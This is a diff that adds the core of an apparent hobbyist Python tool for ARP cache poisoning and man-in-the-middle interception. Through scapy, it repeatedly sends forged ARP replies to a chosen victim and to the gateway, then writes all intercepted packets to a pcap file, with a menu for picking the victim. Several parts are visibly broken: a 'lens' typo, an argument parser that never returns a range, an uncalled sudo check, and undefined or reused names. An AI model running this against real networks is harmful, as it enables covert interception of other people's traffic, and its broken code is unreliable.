@@ -96,3 +96,103 @@ def allow_ip_forwarding():
     subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"])
     # Load  in sysctl settings from the /etc/sysctl.conf file. 
     subprocess.run(["sysctl", "-p", "/etc/sysctl.conf"])
+
+def arp_spoofer(target_ip, target_mac, spoof_ip):
+    """This function needs to be ran twice to update the ARP tables. One time with the gateway IP and MAC, and one time with the target's IP and MAC."""
+
+    # We would want to create an ARP response, by default op=1 which is "who-has" request, to op=2 which is an "is-at" response packet.
+
+    # We can fool the ARP cache by sending a fake packet saying that we're at the routers ip to the target machine, and sending a packet to the router that we are at the target machine's ip.
+
+    pkt = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
+    scapy.send(pkt, verbose=False)
+
+def send_spoof_packets():
+    # We need to send the spoof packets to the gateway and the target device.
+    while True:
+        # We send an ARP packet to the gateway saying that we are at the target machine.
+        arp_spoofer(gateway_info["ip"], gateway_info["mac"], node_to_spoof["ip"])
+
+        # We send ar ARP packet to the target machine saying we are gateway
+
+        arp_spoofer(node_to_spoof["ip"], node_to_spoof["mac"], gateway_info["ip"])
+
+        time.sleep(3)
+
+def packet_sniffer(interface):
+    """This function will be a packet sniffer to capture all the packets sent to the computer whilst the computer is the MITM"""
+
+    # Using sniff function to sniff the packets going to the gateway interface.
+    packets = scapy.sniff(iface = interface, store = False, prn = process_sniffed_pkt)
+
+def process_sniffed_pkt(pkt):
+    """A callback function that works with the packet sniffer. It reads and stores the packets in pcap file"""
+    print("Writing to a pcap file. Press CTRL + C to exi.t")
+    # We append every packet sniffed to the requests.pcap file which can be inspected using wireshark
+    scapy.wrpcap("request.pcap", pkt, append = True)
+
+def print_arp_res(arp_res):
+    """Creating a menu"""
+
+    print(r"""
+    █──█─████─███─███─█──█
+    █─█──█──█──█──█───█──█
+    ██───████──█──███─████
+    █─█──█─█───█────█─█──█
+    █──█─█─█──███─███─█──█""")
+    print("\n*********************")
+    for id, res in enumerate(arp_res):
+        print("{}\t\t{}\t{}".format(id,res['ip'], res['mac']))
+    while True:
+        try:
+            #If the choice is valid then function returns the choice.
+            choice = int(input("Please select the ID of the computer whose ARP cache you want to poison (CTRL + Z to exit): "))
+            if arp_res[choice]:
+                return choice
+        
+        except:
+            print("Please enter a valid choice! ")
+
+def get_cmd_arguments():
+    """This function validates the command line arguments supplies at the beginning"""
+    ip_range = None
+    if lens(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
+        print("-ip_range flag not specified.")
+        return ip_range
+    elif len(sys.argv) - 1 > 0 and sys.argv[1] == "-ip_range":
+        try:
+            #To check if IPv4Network parameter is a valid IP range or not.
+            print(f"{IPv4Network(sys.argv[2])}")
+        except:
+            print("Invalid command-line argument supplied.")
+    return ip_range
+
+#Checks if the program ran in sudo mode
+in_sudo_mode
+
+# Gets the ip range using the get_cmd_arguments()
+ip_range = get_cmd_arguments()
+
+if ip_range == None:
+    print("No valid ip range specified.")
+    exit()
+
+# If not run then internet will be down for the user.
+allow_ip_forwarding()
+
+# Doing the arp scan. The function returnd a list of all clients.
+arp_res = arp_scan(ip_range)
+
+# Exit the script if there's no connection
+if len(arp_res) == 0:
+    print("No connection. Exiting, make sure devices are active or turned on.")
+    exit()
+
+# Function runs a route -n command. Returns a list with the gateway in a dictionary.
+gateways = gateway_info(arp_res)
+
+gateway_info = gateways[0]
+
+# Gateways are removed from the clients
+client_info = clients(arp_res, gateways)
+
